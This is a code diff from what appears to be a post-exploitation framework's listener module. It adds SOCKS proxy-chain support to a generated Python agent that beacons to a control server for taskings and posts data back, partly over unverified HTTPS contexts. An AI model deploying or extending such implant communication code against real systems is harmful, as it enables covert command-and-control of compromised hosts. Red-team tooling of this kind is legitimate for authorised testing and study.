@@ -916,7 +916,19 @@ class Listener(object):
 
                 if listenerOptions['Host']['Value'].startswith('https'):
                     updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
+
+                # Import sockschain code
+                f = open(self.mainMenu.installPath + "/data/agent/stagers/common/sockschain.py")
+                socks_import = f.read()
+                f.close()
+
                 sendMessage = f"""
+def update_proxychain(proxy_list):
+    setdefaultproxy()  # Clear the default chain
+
+    for proxy in proxy_list:
+        addproxy(proxytype=proxy['proxytype'], addr=proxy['addr'], port=proxy['port'])
+
 def send_message(packets=None):
     # Requests a tasking or posts data to a randomized tasking URI.
     # If packets == None, the agent GETs a tasking from the control server.
@@ -942,6 +954,7 @@ def send_message(packets=None):
     requestUri = server + taskURI
 
     try:
+        wrapmodule(urllib.request)
         data = (urllib.request.urlopen(urllib.request.Request(requestUri, data, headers))).read()
         return ('200', data)
 
@@ -959,8 +972,10 @@ def send_message(packets=None):
         missedCheckins = missedCheckins + 1
         return (URLerror.reason, '')
     return ('', '')
+
+
 """
-                return updateServers + sendMessage
+                return socks_import + updateServers + sendMessage
 
             else:
                 print(helpers.color(
